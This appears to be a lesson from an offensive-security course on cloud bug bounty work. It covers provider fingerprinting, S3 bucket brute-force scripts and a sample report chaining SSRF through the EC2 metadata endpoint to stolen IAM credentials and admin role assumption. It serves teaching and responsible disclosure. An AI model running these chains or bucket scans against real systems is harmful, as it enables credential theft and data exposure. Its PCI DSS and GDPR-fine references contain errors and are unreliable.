---
title: "Cloud Bug Bounty Strategy — Cloud-Focused Programmes, IMDSv2, Bucket Brute-Forcing"
tags: [cloud-bug-bounty, AWS, S3, SSRF, IMDSv2, bucket-brute-force, HackerOne,
       Bugcrowd, reconnaissance, methodology, ATT&CK-T1580, cloud-exploitation]
module: 04-BroadSurface-02
day: 193
related_topics:
  - Bug Bounty Reporting (Days 161–165)
  - S3 Misconfiguration Lab (Day 185)
  - SSRF to AWS Metadata Lab (Day 184)
  - Cloud Bug Bounty Strategy (this lesson)
  - Cloud Detection (Day 194)
---

# Day 193 — Cloud Bug Bounty Strategy

> "Cloud findings pay well because they are high-impact and most programmes
> do not have a dedicated cloud security team. The triage engineer at a SaaS
> company does not think about IMDSv1 when they see your SSRF report. You need
> to show them the full path — SSRF to metadata to credentials to admin — in
> the PoC. Then they do. Then it becomes Critical. Always show the full chain."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Identify bug bounty programmes with significant cloud attack surface.
2. Apply a cloud-specific recon methodology to map the target's AWS/Azure/GCP
   footprint.
3. Enumerate S3 bucket names at scale using wordlists and pattern analysis.
4. Test for IMDSv1 exposure through SSRF and document the full chain for a report.
5. Write a cloud-specific finding report that demonstrates full impact to a
   triage engineer.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Bug bounty reporting fundamentals | Days 161–165 |
| SSRF to AWS Metadata Lab | Day 184 |
| S3 Misconfiguration Lab | Day 185 |
| Cloud full attack lab | Day 192 |

---

## Part 1 — Cloud Attack Surface in Bug Bounty Programmes

### 1.1 — Programmes with the Most Cloud Surface

Look for programmes where the product is:
- A SaaS application hosted on AWS/Azure/GCP (compute + storage in scope)
- A developer tool (CI/CD, monitoring, DevOps platform)
- An API-first product (likely Lambda or Kubernetes backend)
- A data analytics company (BigQuery, Redshift, Snowflake integrations)

```bash
# HackerOne: filter by high-value scopes
# Search: "s3.amazonaws.com" OR "blob.core.windows.net" OR "appspot.com"
# In programme scope sections

# Bugcrowd: look for *.amazonaws.com in scope
# Intigriti / YesWeHack: same pattern

# Key scope indicators that mean cloud attack surface:
# - *.amazonaws.com in scope
# - *.s3.amazonaws.com in scope
# - "AWS infrastructure" explicitly mentioned
# - "Cloud services" in scope description
```

### 1.2 — What Findings Pay Well in Cloud

| Finding class | Typical payout range | Difficulty |
|---|---|---|
| SSRF to IMDS + credential extraction | $5k–$50k | Medium |
| Publicly readable S3 with PII | $2k–$25k | Low |
| IAM privilege escalation | $5k–$30k | High |
| Lambda env var exposure (critical data) | $1k–$10k | Low |
| Terraform state file public | $3k–$20k | Low |
| Cross-account role misconfiguration | $5k–$30k | Medium |
| Container escape in production | $10k–$100k | High |

---

## Part 2 — Cloud Recon Methodology

### 2.1 — Phase 1: Identify the Cloud Provider and Account Structure

```bash
TARGET="target-app.com"

# DNS-based cloud fingerprinting
dig $TARGET CNAME | grep -E 'amazonaws|azure|googleapis|cloudfront|elasticloadbalancing'
# elasticloadbalancing.us-east-1.amazonaws.com → AWS behind ALB
# azurewebsites.net → Azure App Service
# appspot.com → GCP App Engine

# HTTP response headers
curl -sI https://$TARGET | grep -iE 'x-amz|x-ms-|x-goog|server:|cf-ray|x-cache'

# Certificate SANs — reveals subdomain inventory
openssl s_client -connect $TARGET:443 2>/dev/null | \
  openssl x509 -noout -text | grep DNS: | tr ',' '\n' | \
  grep -oP 'DNS:\K[^\s]+'

# ASN and IP range lookup — is the IP in AWS/Azure/GCP ranges?
ip=$(dig +short $TARGET | tail -1)
curl -s "https://ipinfo.io/$ip" | jq '{org: .org, region: .region}'
# → "org": "AS16509 Amazon.com, Inc."
```

### 2.2 — Phase 2: Enumerate AWS-Specific Assets

```bash
# Find S3 buckets via passive sources
# Source 1: Wayback Machine
curl -s "https://web.archive.org/cdx/search/cdx?\
url=*.s3.amazonaws.com&output=json&fl=original&limit=1000" \
  | jq -r '.[][0]' | grep -oP '[a-z0-9-]+(?=\.s3)' | sort -u

# Source 2: GitHub code search for the target domain
gh search code "s3.amazonaws.com ${TARGET}" \
  --json path,textMatches --limit 50 | \
  jq -r '.[] | .textMatches[] | .fragment' | \
  grep -oP '[a-z0-9.-]+(?=\.s3\.amazonaws\.com)'

# Source 3: Target's JavaScript bundles
for jsfile in $(curl -s https://$TARGET | \
  grep -oP 'src="\K[^"]+\.js'); do
  curl -s "https://$TARGET/$jsfile" | \
    grep -oP '[a-z0-9-]+\.s3\.amazonaws\.com' | sort -u
done

# Source 4: CloudFront distribution origins
# If the site is behind CloudFront, enumerate CF distributions for the target
```

### 2.3 — Phase 3: Map All Web Endpoints for SSRF

```bash
# Find URL parameters that could be SSRF vectors
# Patterns: url=, callback=, redirect=, endpoint=, webhook=, fetch=,
#           target=, dest=, destination=, uri=, imageUrl=, avatarUrl=

# Spider the application and find fetch-type parameters
gau $TARGET 2>/dev/null | grep -E '[?&](url|callback|redirect|endpoint|webhook|fetch|target|dest|uri|imageurl|src|source|link)='

# Test each one for SSRF
# Use Burp Collaborator or interactsh as the callback host
```

---

## Part 3 — S3 Bucket Brute Forcing at Scale

### 3.1 — Wordlist Generation

```python
# generate_bucket_names.py
# Generate target-specific S3 bucket name wordlist

TARGET_NAME = "targetcorp"   # Company/product name from target

environments = ["", "prod", "production", "staging", "dev", "development",
                "test", "qa", "uat", "sandbox", "demo", "beta"]
services = ["", "api", "app", "web", "mobile", "backend", "frontend",
            "data", "analytics", "logs", "backup", "backups", "assets",
            "static", "media", "uploads", "files", "images", "docs",
            "archive", "exports", "reports", "terraform", "tf", "infra",
            "config", "secrets", "creds", "keys", "internal"]
separators = ["-", "", "."]

names = set()
for env in environments:
    for svc in services:
        for sep in separators:
            parts = [p for p in [TARGET_NAME, env, svc] if p]
            names.add(sep.join(parts))
            names.add(sep.join(reversed(parts)))

with open("bucket_names.txt", "w") as f:
    for name in sorted(names):
        if 3 <= len(name) <= 63:   # S3 name length constraints
            f.write(name + "\n")

print(f"Generated {len(names)} bucket names")
```

### 3.2 — Bucket Existence and Access Check

```bash
# Fast bulk check using curl
check_bucket() {
  bucket=$1
  # Check existence and access level
  resp=$(curl -so /dev/null -w '%{http_code}' \
    "https://${bucket}.s3.amazonaws.com/" --max-time 5 2>/dev/null)
  case $resp in
    200) echo "[PUBLIC] $bucket" ;;
    403) echo "[EXISTS-PRIVATE] $bucket" ;;
    301) echo "[REDIRECT] $bucket" ;;
    404) : ;;   # Does not exist — skip
  esac
}

export -f check_bucket
cat bucket_names.txt | parallel -j 50 check_bucket {}
```

```python
# Or: async Python for speed
import asyncio, aiohttp

async def check_bucket(session: aiohttp.ClientSession, name: str) -> None:
    url = f"https://{name}.s3.amazonaws.com/"
    try:
        async with session.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status == 200:
                print(f"[PUBLIC]  {name}")
            elif r.status == 403:
                print(f"[EXISTS]  {name}")
    except Exception:
        pass

async def main(wordlist: str) -> None:
    async with aiohttp.ClientSession() as session:
        with open(wordlist) as f:
            tasks = [check_bucket(session, line.strip()) for line in f]
        await asyncio.gather(*tasks)

asyncio.run(main("bucket_names.txt"))
```

---

## Part 4 — Writing High-Impact Cloud Reports

### 4.1 — SSRF to IMDS — Report Structure

A common mistake: reporting just the SSRF without showing the cloud impact.
The correct approach is to demonstrate the full chain:

```
Title: SSRF via `url` Parameter Enables AWS Instance Metadata Credential
  Extraction and Account Privilege Escalation

Severity: Critical
CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N → 10.0
(Scope change: attacker accesses AWS management plane, not just the application)

Summary:
The `url` parameter at GET /api/v1/fetch accepts arbitrary URLs and makes
server-side HTTP requests without restriction. By targeting the EC2 Instance
Metadata Service at http://169.254.169.254/, an unauthenticated attacker can
extract temporary AWS IAM credentials for the EC2 instance's attached role.
The attached role (ec2-webapp-role) has sts:AssumeRole permission on
escalation-target-role, which has AdministratorAccess. The complete chain
produces account-level administrative access from a single unauthenticated
HTTP request.

Impact:
  Technical: Unauthenticated extraction of AWS IAM credentials + admin
    escalation. Full access to all S3 buckets, Lambda functions, RDS
    databases, and IAM users in the account.
  Operational: ~1M customer records in app-data-backup S3 bucket accessible.
    Complete account takeover possible. Backdoor IAM users can be planted
    for persistent access.
  Regulatory: GDPR Article 33 — mandatory breach notification within 72 hours.
    PCI DSS 6.5.9 — SSRF classified as required control. Estimated breach
    notification cost: $250k–$2M.

Steps to Reproduce:
  1. curl "https://target-app.com/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
     → Returns: ec2-webapp-role
  2. curl "https://target-app.com/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-webapp-role"
     → Returns JSON with AccessKeyId, SecretAccessKey, Token
  3. export AWS_ACCESS_KEY_ID=... [from step 2]
     aws sts get-caller-identity
     → arn:aws:sts::123456789012:assumed-role/ec2-webapp-role/i-0abc...
  4. aws sts assume-role --role-arn arn:aws:iam::123456789012:role/escalation-target-role --role-session-name poc
     → Admin credentials returned
  5. aws iam list-users   → Full account admin confirmed

PoC: (see attached extract_creds.py)

Remediation:
  1. [Immediate] Enforce IMDSv2 on all EC2 instances:
     aws ec2 modify-instance-metadata-options --instance-id i-0abc... \
       --http-tokens required
  2. [Immediate] Restrict SSRF: implement an allowlist of permitted
     URL prefixes in the /fetch handler. Block private IP ranges
     (RFC 1918) and link-local (169.254.0.0/16) at the application layer.
  3. [High] Remove sts:AssumeRole from ec2-webapp-role's policy. The web
     application does not need to assume other roles.
  4. [High] Apply IMDSv2 as an AWS Config rule to prevent future IMDSv1
     exposure: 'ec2-imdsv2-check'.
```

### 4.2 — S3 Misconfiguration — Report Template

```
Title: Publicly Readable S3 Bucket Exposes Production Customer Data

Severity: Critical
CVSS: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 (High) / programme: Critical

Summary: (3–4 sentences covering bucket name, access level, data type, scale)

Steps to Reproduce:
  1. curl -s "https://app-data-backup.s3.amazonaws.com/"
     → Returns XML listing with 1,247 objects
  2. aws s3 cp s3://app-data-backup/customer-data-2024-01.csv . --no-sign-request
     → 52 MB CSV with email, partial SSN, partial card
  3. wc -l customer-data-2024-01.csv → 1,002,457 lines (1M customers)

Remediation:
  aws s3api put-public-access-block --bucket app-data-backup \
    --public-access-block-configuration \
    'BlockPublicAcls=true,IgnorePublicAcls=true,
     BlockPublicPolicy=true,RestrictPublicBuckets=true'
  Additionally: enable S3 Block Public Access at the account level.
```

---

## Key Takeaways

1. **Show the full chain, not just the SSRF.** A report that says "SSRF exists
   at /fetch" gets triaged as Medium. A report that says "SSRF → IMDS creds →
   assume admin role → 1M customer records" gets triaged as Critical with an
   emergency response.
2. **Bucket brute-forcing is low effort for high payoff.** Generate a target-
   specific wordlist, run it asynchronously, and spend 10 minutes checking
   every publicly readable bucket. Multiple $10k+ findings come from this.
3. **Cloud-focused programmes pay more per finding than web-only programmes.**
   An account-level admin escalation is more severe than any web finding
   short of RCE. The severity ceiling is higher.
4. **IMDSv2 is the key question to ask about every AWS target.** If a server-
   side HTTP request is possible and the target runs on EC2, test for
   `169.254.169.254`. IMDSv2 prevents the exploit; IMDSv1 makes it trivial.
5. **Terraform state files are the highest-yield passive target.** One public
   tfstate file can contain database passwords, API keys, SSH keys, and service
   credentials for every resource in the codebase. Always add tfstate to your
   S3 brute-force wordlist.

---

## Exercises

1. Build a target-specific S3 wordlist for a company named "Acme Corp" with
   products called "Analytics" and "Dataflow". Generate at least 200 names
   using the script from Part 3. Explain your naming pattern strategy.
2. Write a Python async script that checks 1,000 bucket names concurrently,
   outputs a table of public buckets (HTTP 200) and existing-but-private
   buckets (HTTP 403), and records the response time for each.
3. Find an open bug bounty programme on HackerOne or Bugcrowd that explicitly
   includes `*.amazonaws.com` or cloud infrastructure in scope. Map its cloud
   attack surface using the methodology from Part 2. Do not test — just document
   what you would look for.
4. Write the impact section for a finding where: the S3 bucket contains 50k
   enterprise customers' invoice PDFs. Include technical, operational, and
   regulatory impact. Calculate the estimated GDPR fine using the formula:
   max(4% of annual revenue, €20M) — assume €50M annual revenue.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q193.1, Q193.2 …).
> Follow-up questions use hierarchical numbering (Q193.1.1, Q193.1.2 …).

---

## Navigation

← Previous: [Day 192 — Cloud Full Attack Lab](DAY-0192-Cloud-Full-Attack-Lab.md)
→ Next: [Day 194 — Detecting Cloud Attacks](DAY-0194-Detecting-Cloud-Attacks.md)
